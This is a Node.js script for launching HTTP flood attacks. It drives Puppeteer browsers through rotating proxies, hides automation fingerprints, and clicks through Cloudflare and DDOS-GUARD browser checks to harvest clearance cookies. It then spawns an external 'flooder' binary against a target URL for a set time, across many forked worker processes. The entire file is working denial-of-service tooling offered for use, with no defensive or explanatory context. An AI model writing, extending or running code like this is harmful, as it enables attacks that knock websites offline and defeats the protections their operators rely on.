const fs = require('fs');
const cluster = require('cluster');
const { spawn } = require('child_process');
const puppeteer = require('puppeteer');
const os = require('os');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

process.setMaxListeners(0).on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).on("SIGHUP", () => {
    return 1;
}).on("SIGCHILD", () => {
    return 1;
});

var [target, time, threads, ratelimit, proxyfile] = process.argv.slice(2);
const proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);
const Version = Math.floor(Math.random() * (121 - 118 + 1)) + 118;
const userAgent = `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Version}.0.0.0 Safari/537.36`;
let blankPage;

async function create() {
    try {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        const browser = await puppeteer.launch({
            headless: false,
            args: [
                '--incognito',
                '--start-maximized',
                '--disable-blink-features=AutomationControlled',
                '--disable-features=IsolateOrigins,site-per-process',
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-software-rasterizer',
                '--enable-features=NetworkService',
                '--proxy-server=' + proxy,
                '--user-agent=' + userAgent,
                '--auto-open-devtools-for-tabs'
            ],
            ignoreDefaultArgs: ['--enable-automation'],
            defaultViewport: null,
        });

        const pages = await browser.pages();
        blankPage = pages[0];
        await blankPage.goto('about:blank');
        await blankPage.goto(target);
        await blankPage.evaluate((target) => {
            window.open(target, '_blank');
        }, target);

        await new Promise(resolve => setTimeout(resolve, 5000));
        const page = await browser.pages();
        const newPage = page.length > 1 ? page[page.length - 1] : null;

        if (newPage) {
            console.log(' ~~ Connection done');
            await new Promise(resolve => setTimeout(resolve, 9999));
            const titles = await newPage.title();
            console.log(' ~~ Page title: ' + titles);

            if (["DDOS-GUARD", "ddos-guard", "DDOS GUARD", "Check your browser..."].includes(titles)) {
                ratelimit = 1;
            }

            if (["Just a moment...", "Checking your browser..."].includes(titles)) {
                console.log(' ~~ Captcha verified');

                const iframeElement = await newPage.$('iframe[allow="cross-origin-isolated; fullscreen"]');
                if (iframeElement) {
                    console.log(' ~~ Captcha detected');
                }

                const iframeBox = await iframeElement.boundingBox();
                if (!iframeBox) {}              
                const x = iframeBox.x + (iframeBox.width / 2);
                const y = iframeBox.y + (iframeBox.height / 2);                

                await newPage.mouse.move(504, 256);
                await new Promise(resolve => setTimeout(resolve, 300));
                await newPage.mouse.down();
                await new Promise(resolve => setTimeout(resolve, 300));
                await newPage.mouse.up();
                await new Promise(resolve => setTimeout(resolve, 7000));
                console.log(' ~~ Captcha bypassed');
            } else {
                await newPage.mouse.move(504, 256);
                await new Promise(resolve => setTimeout(resolve, 300));
                await newPage.mouse.down();
                await new Promise(resolve => setTimeout(resolve, 300));
                await newPage.mouse.up();

                for(let i = 0; i < 5; i++) {
                    const randomX = Math.floor(Math.random() * (524 - 400 + 1)) + 400;
                    const randomY = Math.floor(Math.random() * (200 - 100 + 1)) + 100;
                    await newPage.mouse.move(randomX, randomY);
                    await new Promise(resolve => setTimeout(resolve, 300));
                    await newPage.mouse.down();
                    await new Promise(resolve => setTimeout(resolve, 300));
                    await newPage.mouse.up();
                }
            }

            await new Promise(resolve => setTimeout(resolve, 2500));
            const titles2 = await newPage.title();
            if (["Just a moment...", "Checking your browser...", "Access denied", "DDOS-GUARD", "Attention Required! | Cloudflare", "Attention Required"].includes(titles2)) {
                console.log(' ~~ Proxy detected, browser and page closed.');
                await newPage.close();
                await browser.close();
            }

            const cookie = await newPage.cookies();
            const cookieString = cookie.map((c) => `${c.name}=${c.value}`).join("; ");

            if (cookieString) {
                console.log(' ~~ Cookies: ', cookieString);
            } else {
                console.log(' ~~ Cookies not found');
            }
            started(proxy, userAgent, cookie);
            await newPage.close();
            await browser.close();
        } else {
            console.error(' ~~ New page not created successfully.');
            await newPage.close();
            await browser.close();            
        }
    } catch (e) {
        create();
        //console.log(e);
    }
}

function started(proxy, userAgent, cookie) {
    const arguments = [
        "GET", target, time, "1", ratelimit, "proxy.txt", "--customproxy", proxy, "--customua", userAgent, "--cookie", cookie, "--delay", "1000"
    ];
    spawn('./script', arguments);
    console.log(' ~~ Flooder started ');
}

if (cluster.isMaster) {
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });
    setTimeout(() => process.exit(), time * 1000);

} else {
    create();
    setTimeout(() => process.exit(), time * 1000);
}